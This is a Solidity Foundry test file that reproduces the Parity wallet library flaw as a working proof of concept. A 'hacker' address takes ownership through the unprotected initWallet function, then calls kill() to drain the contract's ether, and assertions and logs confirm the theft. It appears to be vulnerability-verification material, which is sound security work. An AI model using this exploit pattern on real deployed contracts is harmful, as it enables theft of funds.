// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_2.sol";

contract ParityWalletBug2Test is Test {
    WalletLibrary wallet;
    address payable hacker = payable(address(0xBEEF));
    uint256 constant FUNDING_AMOUNT = 1 ether;

    function setUp() public {
        wallet = new WalletLibrary();
    }

    function testAnybodyCanStealFundsViaKill() public {
        // Set hacker's initial balance to zero
        vm.deal(hacker, 0);
        assertEq(hacker.balance, 0, "Hacker should start with zero balance");

        // Fund the wallet contract
        vm.deal(address(wallet), FUNDING_AMOUNT);
        assertEq(
            address(wallet).balance,
            FUNDING_AMOUNT,
            "WalletLibrary funding failed"
        );

        // Initialize the wallet with hacker as single owner
        address[] memory owners = new address[](1);
        owners[0] = hacker;
        vm.prank(hacker);
        wallet.initWallet(owners, 1, 0); // requiredConfirmations=1, no daily limit

        // Record pre-attack balances for differential verification
        console2.log("--- BEFORE-Trigger Kill ---");
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 hackerBalanceBefore = hacker.balance;
        console2.log("Wallet ETH balance:", walletBalanceBefore);
        console2.log("Hacker ETH balance:", hackerBalanceBefore);

        console2.log("--- Trigger Kill ---");
        // Attack: hacker steals funds using kill()
        vm.prank(hacker);
        wallet.kill(hacker);

        // Record post-attack balances for differential verification
        console2.log("--- AFTER-Trigger Kill ---");
        uint256 walletBalanceAfter = address(wallet).balance;
        uint256 hackerBalanceAfter = hacker.balance;
        console2.log("Wallet ETH balance:", walletBalanceAfter);
        console2.log("Hacker ETH balance:", hackerBalanceAfter);

        // Verify funds were transferred to hacker
        assertEq(
            hacker.balance,
            FUNDING_AMOUNT,
            "Hacker didn't steal funds"
        );
        assertEq(
            address(wallet).balance,
            0,
            "WalletLibrary should be emptied"
        );

        // Vulnerability verdict based on differential state changes
        bool exploited = (walletBalanceAfter == 0) && 
                         (hackerBalanceAfter == hackerBalanceBefore + FUNDING_AMOUNT);
        
        if (exploited) {
            console2.log("VULNERABILITY VERIFICATION RESULT: Funds transferred to hacker after kill()");
            console2.log("Vulnerability Exists: Unauthorized fund transfer via kill() function succeeded");
        } else {
            console2.log("VULNERABILITY VERIFICATION RESULT: No fund transfer detected after kill()");
            console2.log("Vulnerability not Exist: kill() function failed to transfer funds");
        }
    }
}